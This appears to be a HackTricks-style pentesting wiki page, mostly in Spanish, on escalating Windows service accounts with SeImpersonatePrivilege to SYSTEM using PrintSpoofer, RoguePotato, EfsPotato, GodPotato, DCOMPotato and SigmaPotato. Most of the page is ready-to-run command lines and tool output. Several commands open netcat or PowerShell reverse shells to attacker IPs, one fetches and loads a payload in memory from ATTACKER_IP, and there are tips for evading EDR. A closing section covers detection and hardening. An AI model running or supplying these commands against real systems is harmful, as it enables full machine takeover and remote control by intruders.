# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato no funciona** en Windows Server 2019 y Windows 10 build 1809 en adelante. Sin embargo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** pueden usarse para **aprovechar los mismos privilegios y obtener acceso a nivel `NT AUTHORITY\SYSTEM`**. Este [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) profundiza en la herramienta `PrintSpoofer`, que puede usarse para abusar de impersonation privileges en hosts Windows 10 y Server 2019 donde JuicyPotato ya no funciona.

> [!TIP]
> Una alternativa moderna, frecuentemente mantenida en 2024–2025, es SigmaPotato (un fork de GodPotato) que añade in-memory/.NET reflection usage y soporte extendido de OS. Consulta el uso rápido más abajo y el repo en References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requisitos y advertencias comunes

All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges:

- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
- High integrity is not required if the token already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.)

Check privileges quickly:
```cmd
whoami /priv | findstr /i impersonate
```
Notas operativas:

- PrintSpoofer necesita que el servicio Print Spooler esté en ejecución y accesible a través del endpoint RPC local (spoolss). En entornos reforzados donde Spooler está deshabilitado tras PrintNightmare, prefiera RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requiere un resolvedor OXID accesible en TCP/135. Si el egress está bloqueado, use un redirector/port-forwarder (ver ejemplo abajo). Las versiones antiguas necesitaban la opción -f.
- EfsPotato/SharpEfsPotato abusan de MS-EFSR; si una pipe está bloqueada, pruebe pipes alternativas (lsarpc, efsrpc, samr, lsass, netlogon).
- El error 0x6d3 durante RpcBindingSetAuthInfo típicamente indica un servicio de autenticación RPC desconocido/no soportado; pruebe una pipe/transport diferente o asegúrese de que el servicio objetivo esté en ejecución.

## Demostración rápida

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notas:
- Puedes usar -i para spawn un proceso interactivo en la consola actual, o -c para ejecutar un one-liner.
- Requiere el servicio Spooler. Si está deshabilitado, esto fallará.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Si el puerto 135 saliente está bloqueado, pivot the OXID resolver via socat en tu redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Consejo: Si un pipe falla o EDR lo bloquea, prueba los otros pipes compatibles:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notas:
- Funciona en Windows 8/8.1–11 y Server 2012–2022 cuando SeImpersonatePrivilege está presente.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato proporciona dos variantes que apuntan a objetos DCOM de servicio que por defecto usan RPC_C_IMP_LEVEL_IMPERSONATE. Compila o usa los binaries proporcionados y ejecute su comando:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork actualizado de GodPotato)

SigmaPotato añade mejoras modernas, como in-memory execution vía .NET reflection y un PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Notas de detección y endurecimiento

- Supervisar procesos que crean named pipes y que llamen inmediatamente a APIs de duplicación de token seguidas de CreateProcessAsUser/CreateProcessWithTokenW. Sysmon puede mostrar telemetría útil: Event ID 1 (process creation), 17/18 (named pipe created/connected), y líneas de comando que lanzan procesos hijos como SYSTEM.
- Endurecimiento del Spooler: Deshabilitar el servicio Print Spooler en servidores donde no se necesite evita coerciones locales al estilo PrintSpoofer vía spoolss.
- Endurecimiento de cuentas de servicio: Minimizar la asignación de SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege a servicios personalizados. Considerar ejecutar servicios bajo cuentas virtuales con los mínimos privilegios requeridos y aislarlos con service SID y tokens con escritura restringida cuando sea posible.
- Controles de red: Bloquear TCP/135 saliente o restringir el tráfico del RPC endpoint mapper puede romper RoguePotato a menos que haya un redirector interno disponible.
- EDR/AV: Todas estas herramientas están ampliamente firmadas. Recompilar desde la fuente, renombrar símbolos/strings, o usar ejecución en memoria puede reducir la detección pero no derrotará detecciones comportamentales sólidas.

## Referencias

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
